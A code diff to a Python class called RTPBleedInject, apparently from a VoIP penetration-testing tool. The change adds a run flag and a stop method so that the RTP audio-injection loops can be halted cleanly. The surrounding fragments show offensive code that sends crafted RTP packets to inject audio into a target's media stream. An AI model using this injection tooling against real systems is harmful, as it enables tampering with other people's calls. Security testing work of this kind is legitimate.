@@ -23,7 +23,16 @@ class RTPBleedInject:
         self.payload = "0"
         self.file = ""
 
+        self.run = True
+
         self.c = Color()
+
+
+    def stop(self):
+        print(self.c.WHITE)
+        self.run = False
+        exit()
+
 
     def start(self):
         self.port = int(self.port)
@@ -66,7 +75,7 @@ class RTPBleedInject:
         nloop = 0
         size = 0
 
-        while size < 12:
+        while size < 12 and self.run == True:
             try:
                 nloop += 1
                 cloop = hex(nloop)[2:]
@@ -112,7 +121,7 @@ class RTPBleedInject:
 
                     print(f"{self.c.YELLOW}[+] Injecting RTP audio ...{self.c.WHITE}")
 
-                    while cont - size < total:
+                    while cont - size < total and self.run == True:
                         packet = hexdata[cont : cont + (size * 2)]
 
                         nseq = int("%s" % seq, base=16) + 1
@@ -143,7 +152,7 @@ class RTPBleedInject:
             except KeyboardInterrupt:
                 print(f"{self.c.YELLOW}You pressed Ctrl+C!")
                 print(self.c.WHITE)
-                exit()
+                self.run = False
             except:
                 pass
 
